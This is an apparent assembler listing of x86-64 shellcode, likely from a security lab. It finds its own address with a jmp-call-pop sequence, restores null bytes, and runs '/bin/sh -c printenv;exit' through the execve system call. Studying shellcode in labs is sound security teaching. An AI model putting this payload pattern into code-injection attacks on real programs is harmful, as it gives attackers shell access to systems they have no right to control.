     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB6B                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi ; rsi holds exeStr address
     5                                  
     6                                              ; clear the a register
     7 00000003 B800000000                         mov rax,0x0
     8                                  
     9                                              ; restore null bytes to data
    10 00000008 884608                             mov [rsi+flagStr-exeStr-1],al
    11 0000000B 88460B                             mov [rsi+cmdStr-exeStr-1],al
    12 0000000E 884618                             mov [rsi+arrayAddr-exeStr-2],al
    13 00000011 48894632                           mov [rsi+arrayAddr-exeStr+24],rax
    14                                  
    15 00000015 48893425[8C000000]                 mov [arrayAddr], rsi
    16 0000001D 488D7E09                           lea rdi, [byte rsi+flagStr-exeStr]
    17 00000021 48893C25[94000000]                 mov [arrayAddr+8] , rdi
    18 00000029 488D7E0C                           lea rdi, [byte rsi+cmdStr-exeStr]
    19 0000002D 48893C25[9C000000]                 mov [arrayAddr+16] , rdi
    20                                                   
    21                                              ; execve system call
    22 00000035 B83B000000                         mov rax,0x3b
    23 0000003A 48BF-                              mov rdi,exeStr
    23 0000003C [7200000000000000] 
    24 00000044 48BE-                              mov rsi,arrayAddr
    24 00000046 [8C00000000000000] 
    25 0000004E 4889E2                             mov rdx, rsp
    26 00000051 48C1EA04                           shr rdx, 4
    27 00000055 48C1E204                           shl rdx, 4
    28 00000059 B900E6FBF7                         mov ecx, 0xf7fbe600
    29 0000005E 4809CA                             or  rdx, rcx
    30 00000061 0F05                               syscall
    31                                  
    32                                              ; exit system call
    33 00000063 4889C7                             mov rdi,rax
    34 00000066 4831C0                             xor rax, rax
    35 00000069 B03C                               mov al, 0x3c
    36 0000006B 0F05                               syscall
    37                                  
    38 0000006D E890FFFFFF              codeEnd:   call start2
    39                                              ; data
    40 00000072 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    41 0000007B 2D6358                  flagStr:   db "-cX"
    42 0000007E 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    42 00000087 6578697458         
    43 0000008C [7200000000000000]      arrayAddr: dq exeStr
    44 00000094 [7B00000000000000]                 dq flagStr
    45 0000009C [7E00000000000000]                 dq cmdStr
    46 000000A4 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    47 000000AC AC00000000000000        newAddr:   dq newAddr-start
